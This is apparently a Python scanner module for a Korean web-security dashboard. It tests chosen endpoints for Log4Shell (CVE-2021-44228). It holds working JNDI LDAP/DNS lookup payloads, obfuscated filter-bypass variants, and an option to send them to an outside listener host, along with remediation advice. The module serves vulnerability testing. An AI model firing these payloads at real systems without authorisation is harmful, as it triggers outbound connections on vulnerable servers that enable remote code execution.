"""고른 주소마다 Log4j 치환(Log4Shell, CVE-2021-44228)이 사는지 단계로 본다.

노션 '웹 서비스 취약점 목록' 의 RCE 묶음에 Log4Shell 이 있다. 보통 이 취약점은 **바깥 리스너로
걸려 오는 연결** 로 확인하는데, 리스너가 없어도 DAST 가 볼 수 있는 신호가 둘 있다.

  ① 받는 구간  응답이 보낸 헤더 값을 되돌려 주는가(오류 페이지가 User-Agent 를 적는 경우가 흔하다)
  ② 기본       되돌려 줄 때 `${::-표식}` 을 보낸다. 응답에 `표식` 만 오면 **치환이 살아 있다**
               — Log4j 가 값을 해석했다는 뜻이고, 그 자리에 jndi 를 넣을 수 있다 → 취약
  ③ 심화       응답으로 못 볼 때는 시간으로 본다. 닿지 않는 주소(문서용 대역)로 jndi 를 **헤더마다**
               걸면 취약한 서버는 연결을 기다리다 느려지거나 아예 끊긴다 → 끊기면 취약, 느려지면 잠재
               (로그에 적히는 자리가 주소마다 달라서 헤더를 하나만 보면 놓친다 — 11-20 실측)
  ④ 우회       앞단이 `${jndi:` 글자를 막을 때 지나가는 모양(`${${lower:j}ndi:…}` 등)으로 다시 본다

**바깥으로 연결하게 만드는 점검이다.** 보내는 주소는 문서용으로 예약된 대역(RFC 5737 198.51.100.0/24)
이라 남의 서비스에 닿지 않는다. 리스너 칸을 적으면 그 주소로도 한 번 보내고, **걸려 왔는지는 리스너에서
직접 봐야 한다** — 이 모듈은 그것까지 확인하지 못하므로 근거에 '리스너에서 확인하라' 고 적는다.
"""
import re
import time
import uuid

from dashboard import core
from dashboard.core import Check

# 로그에 적히는 자리는 주소마다 다르다 — 하나만 보면 놓친다(11-20 실측: /login 은 User-Agent 로 터지고
# / 와 /backend/lectures 는 같은 값에 멀쩡하다)
DEFAULT_HEADERS = "User-Agent,X-Forwarded-For,Referer,X-Api-Version"

META = {
    "id": "jndi_probe",
    "name": "Log4j 치환(Log4Shell) 점검",
    "category": "입력 검증",
    "kisa": ["CI"],  # 주요정보통신기반시설 웹 항목(dashboard/standards.py)
    "vuln": "RCE",
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "kind": "active",
    "stage": "probe",
    "unit": "endpoint",
    "severity": "critical",
    "attack": [{"tactic": "TA0001", "technique": "T1190", "name": "Exploit Public-Facing Application"},
               {"tactic": "TA0002", "technique": "T1059", "name": "Command and Scripting Interpreter"}],
    "description": "고른 **주소마다** 요청 헤더에 Log4j 치환식을 넣어 ② 응답에 치환 결과가 돌아오는지(살아 있으면 취약), "
                   "③ 닿지 않는 주소로 jndi 를 **헤더마다** 걸었을 때 응답이 끊기거나(취약) 느려지는지(잠재), "
                   "④ 글자를 가린 모양으로도 되는지 봅니다. "
                   "**서버가 바깥으로 연결을 시도하게 만듭니다** — 보내는 주소는 문서용 대역이라 남의 서비스에 닿지 않습니다.",
    "params": [
        {"name": "headers", "need": "required", "label": "넣어 볼 헤더(쉼표)", "default": DEFAULT_HEADERS,
         "help": "Log4Shell 은 애플리케이션이 **로그에 적는** 값에서 터집니다. 헤더가 가장 흔한 자리입니다."},
        {"name": "listener", "need": "optional", "label": "리스너 주소(host:port) — 있으면 거기로도 보냄", "default": "",
         "placeholder": "13.125.54.149:389",
         "help": "팀이 띄운 LDAP·DNS 리스너입니다. **걸려 왔는지는 리스너에서 직접 보세요** — 이 모듈은 못 봅니다."},
    ],
}
_REC = ("Log4j 를 2.17.1(또는 쓰는 계열의 고친 판)로 올립니다. 바로 올릴 수 없으면 "
        "`log4j2.formatMsgNoLookups=true` 를 켜고 `JndiLookup` 클래스를 jar 에서 뺍니다. "
        "함께: 서버에서 **밖으로 나가는 LDAP·RMI·DNS 를 막고**(나가는 통신 허용 목록), 로그에 적는 값에서 "
        "사용자 입력을 그대로 쓰지 않습니다. 치환이 살아 있다는 것만으로도 다른 조회식(`${env:…}`)이 함께 터집니다.")

STAGE = {"screen": "① 받는 구간", "basic": "② 기본", "deep": "③ 심화", "bypass": "④ 우회"}
BLACKHOLE = "198.51.100.1:389"  # RFC 5737 문서용 대역 — 남의 서비스가 아니고 응답도 없다
SLOW = 3.0                       # 기준보다 이 배 넘게 느려지면 연결을 기다린 것으로 본다
MIN_GAP = 1.0                    # 그래도 최소 이만큼(초)은 차이 나야 본다
MAX_HEADERS = 8
# jndi 를 걸었을 때 응답이 아예 끊기는 일이 있다 — 서버가 연결을 기다리다 우리 쪽 제한 시간을 넘긴 것이다.
# 11-20 실측에서 이 예외가 실행 전체를 끊었다. 가장 센 신호인데 기록도 못 남기고 죽는 셈이라 여기서 잡는다.


def substitution(mark: str):
    """응답에서 바로 보이는 치환식들 → [(보낼 값, 응답에 와야 하는 것, 설명)]."""
    return [(f"${{::-{mark}}}", mark, "빈 조회의 기본값 치환"),
            (f"${{lower:{mark.upper()}}}", mark, "소문자 치환"),
            (f"${{upper:{mark}}}", mark.upper(), "대문자 치환")]


def jndi(host: str, mark: str):
    """jndi 조회식들 → [(보낼 값, 설명)]. 뒤쪽은 글자를 가려 앞단 차단을 지나가는 모양이다."""
    return [(f"${{jndi:ldap://{host}/{mark}}}", "그냥"),
            (f"${{${{lower:j}}ndi:${{lower:l}}dap://{host}/{mark}}}", "글자를 조회식으로 가림"),
            (f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{host}/{mark}}}", "글자마다 기본값 치환"),
            (f"${{jndi:dns://{host}/{mark}}}", "dns 로 바꿈")]


def run(target, points, params):
    names = [h.strip() for h in (params.get("headers") or DEFAULT_HEADERS).split(",") if h.strip()][:MAX_HEADERS]
    listener = (params.get("listener") or "").strip()
    out = []
    for p in points:
        lines, verdict, keep, title = [], "safe", None, ""
        mark = "l4j" + uuid.uuid4().hex[:8]

        def note(stage, text):
            lines.append(f"{STAGE[stage]} {text}")

        def send(name, value):
            """(응답, 걸린 초). 응답이 끊기면 응답 자리에 None 을 돌려준다 — 끊긴 것도 신호다."""
            t0 = time.monotonic()
            try:
                return core.fetch(p.url, headers={name: value}), time.monotonic() - t0
            except OSError:
                return None, time.monotonic() - t0

        # ① 받는 구간 — 응답이 헤더 값을 되돌려 주는가
        echoed, base_ms = [], None
        dead = []
        for name in names:
            r, took = send(name, mark)
            if r is None:                       # 표식만 보낸 것도 끊기면 그냥 느린 주소다
                dead.append(name)
                continue
            if base_ms is None:
                base_ms = took
            if mark in r.body:
                echoed.append(name)
        if dead:
            note("screen", "표식만 보낸 요청도 끊긴 헤더: " + ", ".join(dead)
                 + " — 이 주소는 그냥 느리다(아래 판정에서 뺀다)")
        if base_ms is None:
            note("screen", "GET " + p.url + " → 기준 응답을 받지 못함 — 볼 것이 없음(후보 제외)")
            out.append(Check(point=p, verdict="safe", evidence=chr(10).join(lines)))
            continue
        note("screen", f"GET {p.url} → 응답에 되돌아온 헤더: {', '.join(echoed) if echoed else '없음'} "
                       f"· 기준 {int(base_ms * 1000)}ms")
        keep = r
        live = [n for n in names if n not in dead]
        # ② 기본 — 되돌려 줄 때는 치환 결과가 바로 보인다
        for name in echoed:
            for value, want, kind in substitution(mark):
                r, _ = send(name, value)
                if r is None:
                    note("basic", f"{name} {kind}: 응답이 끊김 — 치환 결과를 볼 수 없음")
                    continue
                hit = want in r.body and value not in r.body
                note("basic", f"{name} {kind}: {value} → {r.status} · 응답에 '{want}' {'있음' if hit else '없음'}")
                if hit:
                    note("basic", "보낸 글자가 아니라 **치환 결과** 가 돌아왔다 — Log4j 가 값을 해석한다")
                    verdict, keep, title = "vuln", r, "Log4j 치환이 살아 있음(Log4Shell 성립)"
                    break
            if verdict == "vuln":
                break
        if not echoed:
            note("basic", "응답이 헤더 값을 되돌려 주지 않아 치환 결과를 눈으로 볼 수 없음 — 시간으로 본다")
        # ③ 심화 — 닿지 않는 주소로 걸고 느려지는지. 아예 끊기면 그게 가장 센 신호다.
        # **헤더를 하나만 보면 안 된다.** 11-20 실측: 사용자 웹에서 /login 은 User-Agent 로 25초를
        # 넘겨 끊기는데 / 와 /backend/lectures 는 같은 값에 멀쩡하다. 로그에 적히는 자리가
        # 주소마다 다르기 때문이다. 하나만 보고 '안전' 이라 하면 나머지를 놓친다.
        value, _kind = jndi(BLACKHOLE, mark)[0]
        for name in (live if verdict == "safe" else []):
            r, took = send(name, value)
            if r is None:
                note("deep", f"{name} 에 jndi(닿지 않는 주소): **응답이 끊김**({int(took * 1000)}ms, "
                             f"기준 {int(base_ms * 1000)}ms) — 표식만 보낼 때는 멀쩡했다")
                again, took2 = send(name, value)
                if again is None:
                    note("deep", f"한 번 더 보내도 끊김({int(took2 * 1000)}ms) — 서버가 그 값 때문에 바깥으로 "
                                 "연결을 시도하고 기다린 것이다. 멀쩡한 서버는 이 글자를 해석하지 않는다")
                    verdict, keep, title = "vuln", None, "jndi 조회로 응답이 끊김(바깥 연결 시도)"
                else:
                    note("deep", "두 번째는 응답이 옴 — 우연히 끊긴 것일 수 있다. 리스너로 확정하세요")
                    verdict, keep, title = "potential", again, "jndi 조회에 한 번 끊김(확정 안 됨)"
                break
            note("deep", f"{name} 에 jndi(닿지 않는 주소): → {r.status} · {int(took * 1000)}ms "
                         f"(기준 {int(base_ms * 1000)}ms)")
            if took >= base_ms * SLOW and took - base_ms >= MIN_GAP:
                note("deep", "응답이 뚜렷하게 느려짐 — 서버가 연결을 기다린 흔적. 리스너로 확정하세요")
                verdict, keep, title = "potential", r, "jndi 조회에 연결을 시도한 흔적(응답 지연)"
                break
        # ④ 우회 — 글자를 가린 모양으로 다시
        if verdict == "safe" and echoed:
            for value, kind in jndi(BLACKHOLE, mark)[1:]:
                r, _ = send(echoed[0], value)
                if r is None:
                    note("bypass", f"{kind}: 응답이 끊김 — 가린 모양으로도 바깥 연결을 시도한 것으로 보인다")
                    continue
                left = value in r.body
                note("bypass", f"{kind}: → {r.status} · 보낸 글자가 응답에 {'그대로 있음' if left else '없음(해석됐거나 걸러짐)'}")
                if not left and mark not in r.body:
                    note("bypass", "보낸 글자가 사라졌는데 표식도 안 돌아옴 — 앞단이 거른 것인지 해석된 것인지 가릴 수 없음")
        # 리스너를 적었으면 거기로도 한 번 — 걸려 왔는지는 리스너에서 본다
        if listener:
            for value, kind in jndi(listener, mark):
                r, _ = send(live[0] if live else names[0], value)
                note("bypass", f"리스너로({kind}): {value} → " + (str(r.status) if r else "응답 끊김"))
            note("bypass", f"**리스너({listener})에서 '{mark}' 로 걸려 온 조회가 있는지 직접 보세요** — 이 모듈은 못 봅니다")
            if verdict == "safe":
                title = "리스너 확인 필요(응답으로는 판정 못 함)"
        if verdict == "safe" and not title:
            note("bypass", "치환 결과도 지연도 없음 — 응답으로 볼 수 있는 신호는 없다(리스너로 한 번 더 보는 게 확실하다)")
        out.append(Check(point=p, verdict=verdict, evidence="\n".join(lines), response=keep, title=title,
                         severity="critical" if verdict == "vuln" else "high", recommendation=_REC))
    return out
